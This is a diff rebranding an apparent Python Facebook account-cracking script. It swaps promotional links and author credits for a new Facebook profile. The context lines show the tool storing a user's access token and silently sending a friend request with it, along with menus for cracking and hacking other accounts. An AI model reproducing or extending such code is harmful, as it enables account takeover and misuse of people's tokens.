@@ -178,10 +178,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.facebook.com/Corneliuschinedumsunday1')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.facebook.com/Corneliuschinedumsunday1')
 
 def login():
 	os.system('clear')
@@ -228,7 +228,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;91mLogin Successful.•◄►•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.facebook.com/Corneliuschinedumsunday1')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -416,7 +416,7 @@ def pilih_crack():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
+	        os.system('xdg-open https://www.facebook.com/Corneliuschinedumsunday1')
 	        menu()
         elif peak =="3":
                 os.system('clear')
@@ -437,7 +437,7 @@ def pilih_crack():
 		for p in s['data']:
 			id.append(p['id'])
         elif peak =="4":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://www.facebook.com/Corneliuschinedumsunday1')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -696,10 +696,10 @@ _______¶¶¶_________¶______¶_________¶¶¶______
  
          Checkpoint ID Open After 7 Days
 •\033[1;95m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.
-: \033[1;91m ....Rana Aahil  BlackTiger....... \033[1;95m :
+: \033[1;91m ....Kachi  BlackHacker....... \033[1;95m :
 •\033[1;95m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.' 
                 JOIN ME
-              \033[1;91m FACEBOOK AAHIL"""
+              \033[1;91m FACEBOOK CORNELIUS CHINEDUM SUNDAY"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
@@ -749,7 +749,7 @@ def pilih_hack():
 	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://www.facebook.com/Corneliuschinedumsunday1')
 	        menu()
 	elif peak =="0":
 		menu()
